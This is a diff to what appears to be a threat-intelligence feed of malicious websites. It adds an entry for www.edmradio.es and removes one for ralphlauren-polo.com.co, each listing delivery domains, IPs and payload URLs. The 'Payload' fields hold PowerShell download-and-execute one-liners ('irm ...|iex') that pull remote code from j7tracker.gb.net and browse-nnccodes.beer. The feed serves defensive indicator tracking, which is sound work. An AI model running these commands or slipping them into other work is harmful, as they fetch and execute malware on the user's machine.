@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "www.edmradio.es",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/3d49565511570d7b"
+    ],
+    "IP": [
+      "46.30.215.161"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/3d49565511570d7b')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/3d49565511570d7b"
+    ],
+    "ReportId": "cmwpddiwu23050omlwlpexkd6",
+    "ScannedAt": "2026-11-20T19:26:04.902000+00:00"
+  },
+  {
     "UrlDomain": "andaluzia-design.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -17852,27 +17871,5 @@
     ],
     "ReportId": "cmwb3aant00gt0nmlmc5pa0pm",
     "ScannedAt": "2026-11-10T19:34:51.772000+00:00"
-  },
-  {
-    "UrlDomain": "ralphlauren-polo.com.co",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/20852d0346938afe",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/20852d0346938afe'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/20852d0346938afe"
-    ],
-    "ReportId": "cmwb2fd2s00g10nmllb1yc2q6",
-    "ScannedAt": "2026-11-10T19:10:48.567000+00:00"
   }
 ]
